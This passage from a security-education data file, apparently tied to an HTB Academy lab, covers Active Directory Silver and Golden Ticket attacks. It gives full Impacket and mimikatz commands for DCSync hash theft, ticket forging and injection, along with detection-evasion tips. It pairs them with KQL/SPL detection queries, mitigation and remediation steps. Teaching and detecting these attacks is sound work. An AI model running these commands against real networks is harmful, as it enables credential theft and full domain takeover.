      'Impacket (ticketer.py) or mimikatz on a Windows host.',
    ],
    attackFlow: [
      'Steal a service account NT hash (Kerberoast, DCSync, LSASS).',
      'Collect the SPN, domain FQDN, and domain SID.',
      'Forge a TGS offline using ticketer.py / mimikatz — set the impersonated user to anyone (e.g. Administrator) and stuff the PAC with Domain Admins SIDs.',
      'Inject the ticket into the current session (KRB5CCNAME / kerberos::ptt).',
      'Access the target service directly — the service decrypts, validates, and grants admin access. The DC never sees the request.',
    ],
    walkthrough: [
      {
        title: 'Step 1 — Obtain the service account NT hash',
        description:
          'In the HTB lab path we already cracked the sqlsvc account via Kerberoasting. In the wild the hash typically comes from DCSync, LSASS dump, or a stolen keytab. Whatever the source — we need the NT hash (or AES256 key) of the account that owns the target SPN.',
        commands: [
          'secretsdump.py -just-dc-user sqlsvc INLANEFREIGHT.LOCAL/administrator@10.10.10.161',
        ],
        output: 'sqlsvc:1108:aad3b435b51404eeaad3b435b51404ee:b18b7a3d3e0b0a4e9c5d2f1a8c7b6d5e:::',
        image: { src: adSilverTicketFlow, caption: 'Silver Ticket: forged TGS goes straight to the service, bypassing the KDC entirely.' },
      },
      {
        title: 'Step 2 — Gather domain SID and target SPN',
        description:
          'The forged TGS PAC must contain a valid domain SID otherwise the service rejects the ticket. Get it from any domain-joined host or via Impacket.',
        commands: [
          'lookupsid.py INLANEFREIGHT.LOCAL/htb-student:Academy_student_AD\\!@10.10.10.161 0 | head',
          'whoami /user   # from any domain machine',
        ],
        output: 'Domain SID: S-1-5-21-3842939050-3880317879-2865463114\nSPN target: MSSQLSvc/sql01.inlanefreight.local:1433',
      },
      {
        title: 'Step 3 — Forge the Silver Ticket with ticketer.py',
        description:
          'ticketer.py builds a TGS offline, encrypts it with the supplied NT hash, and stuffs the PAC with whatever SIDs we like. We impersonate "Administrator" and inject the well-known Domain Admins (-512) and Enterprise Admins (-519) SIDs so the target service sees us as a god.',
        commands: [
          'ticketer.py -nthash b18b7a3d3e0b0a4e9c5d2f1a8c7b6d5e \\\n  -domain-sid S-1-5-21-3842939050-3880317879-2865463114 \\\n  -domain INLANEFREIGHT.LOCAL \\\n  -spn MSSQLSvc/sql01.inlanefreight.local:1433 \\\n  -user-id 500 -groups 512,513,518,519,520 \\\n  Administrator',
        ],
        output: '[*] Creating basic skeleton ticket and PAC Infos\n[*] Customizing ticket for INLANEFREIGHT.LOCAL/Administrator\n[*] Saving ticket in Administrator.ccache',
      },
      {
        title: 'Step 4 — Inject and use the ticket',
        description:
          'Export KRB5CCNAME to point at the ccache and Impacket\'s tools will use the forged TGS automatically. From a Windows host, mimikatz kerberos::ptt loads the .kirbi into the current logon session.',
        commands: [
          'export KRB5CCNAME=$PWD/Administrator.ccache',
          'mssqlclient.py -k -no-pass INLANEFREIGHT.LOCAL/Administrator@sql01.inlanefreight.local',
          '# Windows alternative\nmimikatz # kerberos::ptt Administrator.kirbi',
        ],
        output: 'SQL (INLANEFREIGHT\\Administrator  dbo@master)> EXEC xp_cmdshell \'whoami\';\nNT AUTHORITY\\SYSTEM',
      },
      {
        title: 'Step 5 — Persistence considerations',
        description:
          'Silver Tickets live until the service account password is rotated. Resetting krbtgt does NOT invalidate them. Attackers re-use the same hash months later — making this one of the stealthiest persistence techniques in AD.',
        commands: [
          '# Rotate the service-account password to kill all live silver tickets\nNet user sqlsvc <NewPassword> /domain',
        ],
      },
    ],
    commandsCheatsheet: [
      { title: 'Impacket — DCSync hash', command: 'secretsdump.py -just-dc-user <svc> DOMAIN/admin@<DC>' },
      { title: 'Impacket — domain SID', command: 'lookupsid.py DOMAIN/user:pass@<DC> 0' },
      { title: 'Impacket — forge TGS', command: 'ticketer.py -nthash <hash> -domain-sid <SID> -domain DOMAIN -spn <SPN> -user-id 500 -groups 512,513,518,519,520 Administrator' },
      { title: 'Use forged ticket', command: 'export KRB5CCNAME=Administrator.ccache && mssqlclient.py -k -no-pass DOMAIN/Administrator@host' },
      { title: 'Mimikatz — forge + inject', command: 'kerberos::golden /user:Administrator /domain:DOMAIN /sid:<SID> /target:<host> /service:cifs /rc4:<hash> /ptt' },
    ],
    commandExplanations: [
      {
        command: 'ticketer.py -nthash <hash> -domain-sid <SID> -domain DOMAIN -spn MSSQLSvc/sql01:1433 -user-id 500 -groups 512,513,518,519,520 Administrator',
        purpose: 'Forge a Kerberos TGS offline encrypted with the service account NT hash and stuff the PAC with admin SIDs.',
        breakdown: [
          { flag: '-nthash', meaning: 'NT hash of the service account that owns the SPN — used as the encryption key for the forged TGS.' },
          { flag: '-domain-sid', meaning: 'Domain SID prefix — the PAC SIDs (512 = Domain Admins) attach to this prefix.' },
          { flag: '-spn', meaning: 'Service Principal Name we want to access (cifs/, MSSQLSvc/, HTTP/, etc).' },
          { flag: '-user-id 500', meaning: 'RID 500 = built-in Administrator. The impersonated principal.' },
          { flag: '-groups 512,513,518,519,520', meaning: 'Domain Admins, Domain Users, Schema Admins, Enterprise Admins, Group Policy Creators — instant god-mode in the PAC.' },
          { flag: 'Administrator', meaning: 'Username string written into the ticket.' },
        ],
        why: 'Because the service decrypts the TGS with its own NT hash and trusts the PAC implicitly, every group SID we list is granted — no DC verification, no validation call (PAC validation is off by default).',
      },
      {
        command: 'export KRB5CCNAME=$PWD/Administrator.ccache && mssqlclient.py -k -no-pass DOMAIN/Administrator@sql01',
        purpose: 'Inject the forged ticket into the Linux Kerberos cache and authenticate to the target service.',
        breakdown: [
          { flag: 'KRB5CCNAME', meaning: 'Env var pointing to the credential cache MIT Kerberos / Impacket reads from.' },
          { flag: '-k', meaning: 'Use Kerberos (cached ticket) instead of NTLM.' },
          { flag: '-no-pass', meaning: 'Skip password prompt — we already have a ticket.' },
        ],
        why: 'No NTLM, no AS-REQ, no TGS-REQ — traffic looks like a normal authenticated SMB/MSSQL session to the target. The DC has zero visibility.',
      },
    ],
    toolsExplained: [
      { name: 'Impacket — secretsdump.py', category: 'Credential Access', purpose: 'DCSync the NT hash of any account.', why: 'Single command pulls the service account hash needed to forge the ticket.', link: 'https://github.com/fortra/impacket' },
      { name: 'Impacket — ticketer.py', category: 'Kerberos Forgery', purpose: 'Build Silver / Golden Tickets offline on Linux.', why: 'No mimikatz needed; produces a portable .ccache that any Impacket tool can use.', link: 'https://github.com/fortra/impacket' },
      { name: 'Mimikatz', category: 'Kerberos / Windows', purpose: 'Forge & inject Silver / Golden Tickets natively.', why: 'kerberos::golden + /ptt loads the forged TGS straight into the current logon session — no disk artefact.', link: 'https://github.com/gentilkiwi/mimikatz' },
      { name: 'Rubeus', category: 'Kerberos / Windows', purpose: 'Modern alternative to mimikatz for ticket abuse.', why: 'C# (in-memory friendly), supports AES keys, and integrates with C2.', link: 'https://github.com/GhostPack/Rubeus' },
      { name: 'lookupsid.py', category: 'Recon', purpose: 'Enumerate domain SID + user RIDs anonymously or with creds.', why: 'Required for the -domain-sid flag in ticketer.py.', link: 'https://github.com/fortra/impacket' },
    ],
    enumerationDetection: [
      {
        title: 'Hash theft precursor — DCSync (4662)',
        description: 'A Silver Ticket needs a service-account hash. Spotting DCSync (Replicating Directory Changes rights used by a non-DC account) is the earliest detection point.',
        eventIds: ['4662'],
        dataSource: 'Domain Controller — Security log',
        queryLanguage: 'KQL',
        severity: 'Critical',
        query: 'SecurityEvent\n| where EventID == 4662\n| where Properties has "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"  // DS-Replication-Get-Changes\n   or  Properties has "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"  // DS-Replication-Get-Changes-All\n| where AccountName !endswith "$"',
      },
      {
        title: 'LSASS access — hash dumping',
        description: 'Hash theft from LSASS is the second most common precursor. Sysmon Event 10 with target=lsass.exe and unusual GrantedAccess masks is the giveaway.',
        eventIds: ['10'],
        dataSource: 'Sysmon',
        queryLanguage: 'KQL',
        severity: 'High',
        query: 'Event\n| where Source == "Microsoft-Windows-Sysmon" and EventID == 10\n| where TargetImage endswith "lsass.exe"\n| where GrantedAccess in ("0x1010","0x1410","0x1438","0x143a","0x1fffff")',
      },
    ],
    socDetection: [
      {
        title: 'TGS use without preceding TGS-REQ',
        description: 'A real TGS use generates Event 4769 on the DC immediately before the service is hit. A Silver Ticket skips this — so a service authentication (4624 logon type 3 with Kerberos) on the member server with NO matching 4769 within ±2 minutes on the DC is a very strong indicator.',
        eventIds: ['4624', '4769'],
        dataSource: 'DC Security log + Member server Security log (correlation)',
        queryLanguage: 'KQL',
        severity: 'Critical',
        query: 'let kerbLogons = SecurityEvent\n| where EventID == 4624 and LogonType == 3 and AuthenticationPackageName == "Kerberos"\n| project lt=TimeGenerated, TargetUserName, IpAddress, Computer;\nlet tgsReqs = SecurityEvent\n| where EventID == 4769\n| project rt=TimeGenerated, TargetUserName, IpAddress;\nkerbLogons\n| join kind=leftanti tgsReqs on TargetUserName, IpAddress\n   and $left.lt between ((rt - 2m) .. (rt + 2m))\n| where TargetUserName !endswith "$" and TargetUserName != "ANONYMOUS LOGON"',
      },
      {
        title: 'PAC anomalies — non-standard logon attributes',
        description: 'Forged PACs often have inconsistencies: logon time = 0, ticket lifetime = 10 years, or impossible group memberships. Defender for Identity flags these as "Suspected Golden / Silver Ticket usage".',
        eventIds: ['4624', '4769'],
        dataSource: 'Microsoft Defender for Identity',
        queryLanguage: 'KQL',
        severity: 'Critical',
        query: 'IdentityLogonEvents\n| where ActionType == "LogonSuccess" and Protocol == "Kerberos"\n| where AdditionalFields has "encryption_type:0x17" or AdditionalFields has "ticket_lifetime > 10h"',
      },
      {
        title: 'Service-account interactive use',
        description: 'Service accounts shouldn\'t produce interactive (LogonType 2/10) logons — only network (3) and service (5). A 4624 LogonType 2 for a service account is a textbook impersonation indicator.',
        eventIds: ['4624'],
        dataSource: 'Member servers — Security log',
        queryLanguage: 'SPL',
        severity: 'High',
        query: 'index=wineventlog EventCode=4624 (Logon_Type=2 OR Logon_Type=10) Account_Name="svc-*"\n| stats count by Account_Name, Workstation_Name, Logon_Type',
      },
    ],
    detection: [
      'Correlate 4624 (Kerberos logon on member server) with 4769 (TGS-REQ on DC). Missing 4769 = forged ticket.',
      'Microsoft Defender for Identity native detection: "Suspected Silver Ticket usage".',
      'Alert on RC4 (0x17) Kerberos tickets on services that should negotiate AES (0x12).',
      'Hunt for DCSync (4662 with Replicating Directory Changes) and LSASS access (Sysmon 10) — Silver Ticket prerequisites.',
      'Service accounts performing interactive logons (4624 LogonType 2/10).',
    ],
    mitigation: [
      'Migrate every service account to Group Managed Service Accounts (gMSA) — passwords auto-rotate every 30 days, killing any existing Silver Ticket on rotation.',
      'Force AES-only on the forest (msDS-SupportedEncryptionTypes = 0x18) so RC4 tickets stand out.',
      'Enable PAC validation on critical services (KrbtgtFullPacSignature) — the service then verifies the PAC with the KDC, catching forged group SIDs.',
      'Tier the AD model: never let service accounts accumulate Domain Admin or local admin on Tier-0 hosts.',
      'Rotate service-account passwords every 90 days at minimum; immediately on any incident touching that account.',
    ],
    remediation: [
      'Identify the compromised service account; reset its password TWICE (immediately + after 24h) to invalidate every Silver Ticket and clear cached keys.',
      'Audit the target service (MSSQL, CIFS, etc) for any actions during the suspected window — the attacker had impersonation rights.',
      'Review all Tier-0 group memberships (Domain Admins, Enterprise Admins) — Silver Tickets are often a stepping stone to Golden.',
      'Pull all 4624 / 4769 logs from the affected member server for 90 days and hunt for prior Silver Ticket use.',
      'Migrate the affected SPN to a gMSA so future password rotation is automatic.',
      'If Domain Admin compromise is suspected, also reset krbtgt twice (10-hour gap) to kill any Golden Tickets.',
    ],
    mitre: [
      { id: 'T1558.002', name: 'Silver Ticket', url: 'https://attack.mitre.org/techniques/T1558/002/' },
      { id: 'T1550.003', name: 'Pass the Ticket', url: 'https://attack.mitre.org/techniques/T1550/003/' },
      { id: 'T1003.006', name: 'OS Credential Dumping — DCSync', url: 'https://attack.mitre.org/techniques/T1003/006/' },
    ],
    tools: ['Impacket (ticketer.py, secretsdump.py, lookupsid.py)', 'Mimikatz', 'Rubeus', 'PowerView', 'BloodHound'],
    references: [
      { title: 'HTB Academy — Kerberos Attacks', url: 'https://academy.hackthebox.com/module/details/143' },
      { title: 'MITRE ATT&CK T1558.002', url: 'https://attack.mitre.org/techniques/T1558/002/' },
      { title: 'Microsoft — Group Managed Service Accounts', url: 'https://learn.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview' },
      { title: 'SpecterOps — A Case Study in Wagging the Dog (Silver/Golden)', url: 'https://posts.specterops.io/' },
    ],
  },
  // ======================= GOLDEN TICKET =======================
  {
    id: 'ad-golden-ticket',
    slug: 'ad-golden-ticket',
    name: 'Golden Ticket — Forging TGTs with the krbtgt Hash',
    shortName: 'Golden Ticket',
    category: 'Persistence',
    severity: 'Critical',
    difficulty: 'Insane',
    publishedAt: '2025-05-12',
    author: 'Ahmed Tareq',
    readingTime: 15,
    labProvider: 'HackTheBox',
    labName: 'Kerberos Attacks — HTB Academy',
    labUrl: 'https://academy.hackthebox.com/module/details/143',
    coverImage: adGoldenTicketHero,
    summary:
      'A Golden Ticket is a forged Kerberos TGT signed with the krbtgt account NT hash. Because every TGS in the domain is built from a TGT the KDC trusts, owning the krbtgt hash means owning the forest — the attacker can impersonate any user (including non-existent ones) for any service, with a default ticket lifetime of 10 years. It is the apex AD persistence technique.',
    prerequisites: [
      'Domain Admin (or DCSync rights) — required to extract the krbtgt NT hash.',
      'Domain SID (S-1-5-21-...) and FQDN of the target domain.',
      'krbtgt NT hash or AES256 key (preferred — survives RC4 disable).',
      'Mimikatz on Windows OR Impacket ticketer.py on Linux.',
    ],
    attackFlow: [
      'Compromise a Domain Admin (phishing, Kerberoast → DA, ADCS ESC, BloodHound path).',
      'DCSync the krbtgt account to extract its NT / AES256 hash.',
      'Collect the domain SID.',
      'Forge a TGT offline impersonating any user (often a fake account) with Domain Admin SIDs in the PAC.',
      'Inject the TGT into the current session (kerberos::ptt or KRB5CCNAME).',
      'Use the TGT to request TGS for any service in the domain — the KDC validates because the signature matches krbtgt.',
      'Maintain stealth persistence for years until krbtgt is rotated TWICE.',
    ],
    walkthrough: [
      {
        title: 'Step 1 — DCSync the krbtgt hash',
        description:
          'Once you reach Domain Admin (or any account with Replicating Directory Changes / All rights), you can ask the DC to replicate the krbtgt secrets to you — no LSASS dump on the DC needed. secretsdump.py with -just-dc-user pulls only krbtgt to keep the noise down.',
        commands: [
          'secretsdump.py -just-dc-user krbtgt INLANEFREIGHT.LOCAL/administrator@10.10.10.161',
        ],
        output: 'krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9b1d1b3a8c6e4f9d2e0b1c5a7f8d9e3a:::\nkrbtgt:aes256-cts-hmac-sha1-96:7e2c4d...c1a',
        image: { src: adGoldenTicketFlow, caption: 'Golden Ticket: forged TGT signed with krbtgt → KDC trusts it → TGS for any service.' },
      },
      {
        title: 'Step 2 — Collect domain SID',
        description:
          'The PAC SIDs in the forged TGT must attach to the real domain SID prefix. Pull it once and reuse for every Golden Ticket you forge in this domain.',
        commands: [
          'lookupsid.py INLANEFREIGHT.LOCAL/administrator:Pass\\!@10.10.10.161 0 | grep "Domain SID"',
          '# Or from any joined host:\nwhoami /user',
        ],
        output: 'Domain SID: S-1-5-21-3842939050-3880317879-2865463114',
      },
      {
        title: 'Step 3 — Forge the Golden TGT (Linux / Impacket)',
        description:
          'ticketer.py builds a fully formed TGT, signs it with the krbtgt key and stuffs the PAC with whatever group SIDs we like. Impersonating a fake user (e.g. "totallyNotABackdoor") makes the ticket invisible to user-based hunting queries.',
        commands: [
          'ticketer.py -nthash 9b1d1b3a8c6e4f9d2e0b1c5a7f8d9e3a \\\n  -domain-sid S-1-5-21-3842939050-3880317879-2865463114 \\\n  -domain INLANEFREIGHT.LOCAL \\\n  -user-id 500 -groups 512,513,518,519,520 \\\n  totallyNotABackdoor',
        ],
        output: '[*] Creating basic skeleton ticket and PAC Infos\n[*] Customizing ticket for INLANEFREIGHT.LOCAL/totallyNotABackdoor\n[*] PAC_LOGON_INFO\n[*] PAC_CLIENT_INFO_TYPE\n[*] EncTicketPart\n[*] EncAsRepPart\n[*] Saving ticket in totallyNotABackdoor.ccache',
      },
      {
        title: 'Step 4 — Forge from Windows (Mimikatz)',
        description:
          'On a Windows beachhead, mimikatz kerberos::golden builds and optionally injects the TGT in one go. /ptt loads it directly into the current logon session — zero disk artefacts, ready to use immediately.',
        commands: [
          'mimikatz # privilege::debug',
          'mimikatz # kerberos::golden /user:Administrator /domain:INLANEFREIGHT.LOCAL /sid:S-1-5-21-3842939050-3880317879-2865463114 /krbtgt:9b1d1b3a8c6e4f9d2e0b1c5a7f8d9e3a /id:500 /groups:512,513,518,519,520 /ptt',
          'mimikatz # misc::cmd',
        ],
        output: 'Golden ticket for "Administrator @ INLANEFREIGHT.LOCAL" successfully submitted for current session',
      },
      {
        title: 'Step 5 — Use the TGT against any service',
        description:
          'Once the TGT is in cache, every Kerberos request is signed with krbtgt — the KDC issues TGS for any SPN. We can DCSync, dump SAM on every host, copy NTDS.dit, anything.',
        commands: [
          'export KRB5CCNAME=$PWD/totallyNotABackdoor.ccache',
          'psexec.py -k -no-pass INLANEFREIGHT.LOCAL/totallyNotABackdoor@dc01.inlanefreight.local',
          'secretsdump.py -k -no-pass dc01.inlanefreight.local',
        ],
        output: 'Impacket v0.11.0 ...\n[*] Requesting shares on dc01.inlanefreight.local.....\nNT AUTHORITY\\SYSTEM',
      },
      {
        title: 'Step 6 — Long-term persistence',
        description:
          'Default Golden Ticket lifetime is 10 years. Even if the compromised DA password is reset and Domain Admins are cleaned out, the Golden Ticket survives — until krbtgt is rotated TWICE (must be twice because the DC keeps the previous key for the krbtgtKeyVersionNumber to handle in-flight tickets).',
        commands: [
          '# Detection-evading variant — set lifetime to default (10h) to blend with normal tickets\nticketer.py -nthash <hash> -domain-sid <SID> -domain DOMAIN -duration 10 backdoorAdmin',
        ],
      },
    ],
    commandsCheatsheet: [
      { title: 'Impacket — DCSync krbtgt', command: 'secretsdump.py -just-dc-user krbtgt DOMAIN/admin@<DC>' },
      { title: 'Impacket — domain SID', command: 'lookupsid.py DOMAIN/user:pass@<DC> 0 | grep "Domain SID"' },
      { title: 'Impacket — forge Golden TGT', command: 'ticketer.py -nthash <krbtgt> -domain-sid <SID> -domain DOMAIN -user-id 500 -groups 512,513,518,519,520 fakeuser' },
      { title: 'Mimikatz — forge + inject', command: 'kerberos::golden /user:Administrator /domain:DOMAIN /sid:<SID> /krbtgt:<hash> /id:500 /groups:512,513,518,519,520 /ptt' },
      { title: 'Use Golden ticket', command: 'export KRB5CCNAME=ticket.ccache && psexec.py -k -no-pass DOMAIN/user@dc01' },
      { title: 'Reset krbtgt (twice!)', command: 'Reset-KrbtgtKeyInteractive.ps1 -Mode 4   # run twice, 10h apart' },
    ],
    commandExplanations: [
      {
        command: 'secretsdump.py -just-dc-user krbtgt DOMAIN/administrator@<DC>',
        purpose: 'DCSync only the krbtgt account to extract its NT and AES keys — quietest way to grab the keys to the kingdom.',
        breakdown: [
          { flag: '-just-dc-user krbtgt', meaning: 'Replicate secrets for only one principal — minimal noise vs full DCSync.' },
          { flag: 'DOMAIN/administrator@<DC>', meaning: 'Authentication context — must be DA or hold Replicating Directory Changes / All.' },
        ],
        why: 'Full secretsdump pulls every account (slow, very loud, often alerts EDR). -just-dc-user krbtgt is surgical — one MS-DRSR call, one account in the output.',
      },
      {
        command: 'ticketer.py -nthash <krbtgt> -domain-sid <SID> -domain DOMAIN -user-id 500 -groups 512,513,518,519,520 fakeuser',
        purpose: 'Forge a Kerberos TGT offline signed with the krbtgt key, with arbitrary user identity and group SIDs.',
        breakdown: [
          { flag: '-nthash', meaning: 'krbtgt NT hash — used as the encryption + signing key for the forged TGT.' },
          { flag: '-domain-sid', meaning: 'Domain SID prefix (the PAC group SIDs concatenate to this).' },
          { flag: '-user-id 500', meaning: 'RID 500 = built-in Administrator. Many SIEMs alert on impersonation of the real Administrator — use a custom RID + fake username for stealth.' },
          { flag: '-groups 512,513,518,519,520', meaning: 'Domain Admins, Domain Users, Schema Admins, Enterprise Admins, Group Policy Creator Owners — full forest takeover SIDs.' },
          { flag: 'fakeuser', meaning: 'The username string baked into the ticket. Can be ANY string — even users that do not exist.' },
        ],
        why: 'Because the KDC only verifies that the TGT was encrypted with the current krbtgt key, every PAC SID we list is granted with no further validation. The username can be totally fictional.',
      },
      {
        command: 'kerberos::golden /user:Administrator /domain:DOMAIN /sid:<SID> /krbtgt:<hash> /id:500 /groups:512,513,518,519,520 /ptt',
        purpose: 'Mimikatz one-liner that forges and injects the Golden TGT into the current logon session.',
        breakdown: [
          { flag: '/krbtgt', meaning: 'krbtgt NT hash (RC4) used to sign the TGT.' },
          { flag: '/aes256', meaning: 'Alternative — sign with AES256 key (harder to detect since RC4 looks suspicious in AES-only environments).' },
          { flag: '/id:500', meaning: 'RID for the impersonated principal (500 = built-in Administrator).' },
          { flag: '/ptt', meaning: 'Pass-The-Ticket — inject straight into LSA without writing a .kirbi file to disk.' },
          { flag: '/endin /renewmax /startoffset', meaning: 'Optional flags to shrink ticket lifetime so it blends with normal 10-hour TGTs.' },
        ],
        why: 'In-memory injection avoids disk artefacts and keeps the ticket scoped to the running shell — when the process exits, the ticket vanishes, leaving almost no forensic trace.',
      },
    ],
    toolsExplained: [
      { name: 'Impacket — secretsdump.py', category: 'Credential Access', purpose: 'DCSync the krbtgt hash from a non-DC host.', why: 'Single command, no LSASS interaction, works from any host with DA creds.', link: 'https://github.com/fortra/impacket' },
      { name: 'Impacket — ticketer.py', category: 'Kerberos Forgery', purpose: 'Forge Golden / Silver TGTs on Linux.', why: 'Cross-platform alternative to mimikatz; produces .ccache that any Impacket tool consumes.', link: 'https://github.com/fortra/impacket' },
      { name: 'Mimikatz', category: 'Kerberos / Windows', purpose: 'Forge and pass-the-ticket natively on Windows.', why: 'kerberos::golden + /ptt is the canonical Golden Ticket workflow for two decades.', link: 'https://github.com/gentilkiwi/mimikatz' },
      { name: 'Rubeus', category: 'Kerberos / Windows', purpose: 'Modern .NET ticket abuse (golden, silver, S4U).', why: 'Runs in-memory from C2; supports AES keys and stealthy ticket lifetimes.', link: 'https://github.com/GhostPack/Rubeus' },
      { name: 'BloodHound', category: 'Path Mapping', purpose: 'Find the path from foothold → Domain Admin (the krbtgt prerequisite).', why: 'Golden Ticket needs DA first. BloodHound shortest-path queries (e.g. ShortestPathToDomainAdmins) reveal it instantly.', link: 'https://bloodhound.specterops.io' },
      { name: 'Reset-KrbtgtKeyInteractive.ps1', category: 'Defense / IR', purpose: 'Microsoft-signed script for safe krbtgt double-rotation.', why: 'Rotating krbtgt the wrong way breaks every Kerberos auth in the forest. This script does it safely.', link: 'https://github.com/microsoft/New-KrbtgtKeys.ps1' },
    ],
    enumerationDetection: [
      {
        title: 'DCSync — krbtgt extraction precursor',
        description: 'Every Golden Ticket starts with a DCSync of krbtgt. Watching 4662 with the DS-Replication-Get-Changes-All GUID from a non-DC account is the highest-fidelity precursor signal in the entire AD attack surface.',
        eventIds: ['4662'],
        dataSource: 'Domain Controller — Security log',
        queryLanguage: 'KQL',
        severity: 'Critical',
        query: 'SecurityEvent\n| where EventID == 4662\n| where Properties has "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"  // DS-Replication-Get-Changes\n   or  Properties has "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"  // DS-Replication-Get-Changes-All\n   or  Properties has "89e95b76-444d-4c62-991a-0facbeda640c"  // DS-Replication-Get-Changes-In-Filtered-Set\n| where AccountName !endswith "$" and AccountName != "MSOL_*"',
      },
      {
        title: 'Tooling on endpoints — secretsdump / mimikatz',
        description: 'Catch the operator before they finish the job. Look for secretsdump.py / mimikatz strings in command lines and Sysmon Image Loaded events for samlib.dll + cryptdll.dll into non-LSASS processes.',
        eventIds: ['4688', '4104', '7'],
        dataSource: 'Endpoint — Sysmon / Defender',
        queryLanguage: 'KQL',
        severity: 'Critical',
        query: 'DeviceProcessEvents\n| where ProcessCommandLine has_any ("secretsdump","just-dc-user","kerberos::golden","krbtgt","mimikatz","sekurlsa")',
      },
    ],
    socDetection: [
      {
        title: 'Golden Ticket — TGS-REQ without preceding TGT (4769 without 4768)',
        description: 'A real session always has a 4768 (TGT issued) preceding any 4769 (TGS issued). A Golden Ticket skips 4768 because the TGT was forged offline. So 4769 events for an account with NO matching 4768 in the last 10 hours = textbook Golden Ticket use.',
        eventIds: ['4768', '4769'],
        dataSource: 'Domain Controller — Security log',
        queryLanguage: 'KQL',
        severity: 'Critical',
        query: 'let asReps = SecurityEvent\n| where EventID == 4768\n| project at=TimeGenerated, TargetUserName;\nlet tgsReqs = SecurityEvent\n| where EventID == 4769\n| where ServiceName !endswith "$"\n| project rt=TimeGenerated, TargetUserName, ServiceName, IpAddress;\ntgsReqs\n| join kind=leftanti asReps on TargetUserName\n   and $left.rt between ((at) .. (at + 10h))\n| where TargetUserName !in ("ANONYMOUS LOGON")',
      },
      {
        title: 'Impossible / non-existent accounts in 4769',
        description: 'Operators love to forge tickets for users that do not exist (totallyNotABackdoor). Cross-reference 4769 TargetUserName against AD — any name that is not in the directory is a guaranteed Golden Ticket.',
        eventIds: ['4769'],
        dataSource: 'Domain Controller + AD inventory',
        queryLanguage: 'KQL',
        severity: 'Critical',
        query: 'let validUsers = IdentityInfo | distinct AccountName;\nSecurityEvent\n| where EventID == 4769\n| where TargetUserName !endswith "$"\n| join kind=leftanti validUsers on $left.TargetUserName == $right.AccountName\n| project TimeGenerated, TargetUserName, ServiceName, IpAddress',
      },
      {
        title: 'Anomalous ticket lifetime / encryption',
        description: 'Default forged TGT lifetime is 10 years. Modern domains negotiate AES (0x12) — RC4 (0x17) on krbtgt-signed tickets is suspicious. Defender for Identity flags both natively.',
        eventIds: ['4769', '4624'],
        dataSource: 'Microsoft Defender for Identity',
        queryLanguage: 'KQL',
        severity: 'Critical',
        query: 'IdentityLogonEvents\n| where Protocol == "Kerberos"\n| where AdditionalFields has "encryption_type:0x17"\n   or AdditionalFields has "ticket_lifetime > 10h"\n   or AdditionalFields has "ticket_renewal > 7d"',
      },
      {
        title: 'krbtgt account activity baseline',
        description: 'The krbtgt account itself should NEVER appear as a logon source. Any 4624 or 4768 with TargetUserName=krbtgt outside of a planned key-rotation window is a Tier-0 incident.',
        eventIds: ['4624', '4768'],
        dataSource: 'Domain Controller — Security log',
        queryLanguage: 'SPL',
        severity: 'Critical',
        query: 'index=wineventlog (EventCode=4624 OR EventCode=4768) (Account_Name="krbtgt" OR Target_User_Name="krbtgt")\n| stats count by EventCode, Account_Name, Computer, Source_Network_Address',
      },
    ],
    detection: [
      'Correlate 4769 (TGS) with 4768 (TGT). TGS without a preceding TGT = Golden Ticket.',
      'Alert on 4769 TargetUserName not present in AD inventory (forged fake users).',
      'Microsoft Defender for Identity native: "Suspected Golden Ticket usage (forged authorization data)".',
      'Hunt for DCSync (4662 with Replicating-Directory-Changes-All) — the krbtgt extraction precursor.',
      'Process telemetry for secretsdump.py, mimikatz, kerberos::golden, krbtgt strings.',
      'krbtgt account appearing in any 4624 / 4768 / 4769 outside a documented rotation window.',
      'Kerberos tickets with non-default lifetime (>10h) or RC4 encryption in AES-only domains.',
    ],
    mitigation: [
      'Tier-0 isolation: only Tier-0 admins can log into DCs; Tier-0 accounts never log into workstations.',
      'Rotate krbtgt twice (10h apart) every 180 days as routine hygiene — kills any latent Golden Ticket.',
      'Force AES-only Kerberos (msDS-SupportedEncryptionTypes = 0x18) so RC4 forged tickets stand out.',
      'Enable Protected Users group for all Tier-0 accounts (no NTLM, no unconstrained delegation, 4h ticket lifetime).',
      'Deploy Microsoft Defender for Identity / Azure ATP — it has purpose-built Golden Ticket detections.',
      'Audit and remove unnecessary Replicating Directory Changes / All rights — only DCs and AAD Connect should have them.',
    ],
    remediation: [
      'IMMEDIATELY reset krbtgt password TWICE with at least 10 hours between resets (use Microsoft-signed Reset-KrbtgtKeyInteractive.ps1).',
      'Force-reset every Domain Admin and Tier-0 service account password.',
      'Pull 1 year of 4768 / 4769 / 4624 logs and hunt for prior Golden Ticket use (orphan TGS, fake usernames).',
      'Audit every change made by accounts in the suspect window — assume full forest compromise.',
      'Rebuild any host the attacker authenticated to with the Golden Ticket; assume implant.',
      'Review and remove all DCSync rights; restrict to DCs and Azure AD Connect only.',
      'Consider rotating the entire forest trust + reissuing certificates if ADCS was reachable from the compromised tier.',
    ],
    mitre: [
      { id: 'T1558.001', name: 'Golden Ticket', url: 'https://attack.mitre.org/techniques/T1558/001/' },
      { id: 'T1003.006', name: 'OS Credential Dumping — DCSync', url: 'https://attack.mitre.org/techniques/T1003/006/' },
      { id: 'T1550.003', name: 'Pass the Ticket', url: 'https://attack.mitre.org/techniques/T1550/003/' },
      { id: 'T1078.002', name: 'Valid Accounts — Domain Accounts', url: 'https://attack.mitre.org/techniques/T1078/002/' },
    ],
    tools: ['Impacket (secretsdump.py, ticketer.py, lookupsid.py)', 'Mimikatz', 'Rubeus', 'BloodHound', 'Reset-KrbtgtKeyInteractive.ps1'],
    references: [
      { title: 'HTB Academy — Kerberos Attacks', url: 'https://academy.hackthebox.com/module/details/143' },
      { title: 'MITRE ATT&CK T1558.001', url: 'https://attack.mitre.org/techniques/T1558/001/' },
      { title: 'Microsoft — Reset the krbtgt account password', url: 'https://github.com/microsoft/New-KrbtgtKeys.ps1' },
      { title: 'Sean Metcalf — Detecting Forged Kerberos Tickets', url: 'https://adsecurity.org/?p=1515' },
      { title: 'SpecterOps — Kerberos Bronze Bit / Golden Ticket research', url: 'https://posts.specterops.io/' },
    ],
  },
  // ======================= PASS-THE-HASH =======================
  {
    id: 'ad-pass-the-hash',
    slug: 'ad-pass-the-hash',
